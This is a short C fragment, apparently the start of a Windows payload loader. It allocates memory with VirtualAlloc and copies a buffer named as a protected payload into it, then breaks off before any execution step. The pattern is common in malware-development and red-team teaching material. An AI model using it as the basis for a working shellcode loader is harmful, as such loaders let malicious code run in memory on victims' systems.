int main(int argc, char* argv[]) {
	PBYTE pPayload = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	RtlMoveMemory(pPayload, pProtected, sPayloadSize);

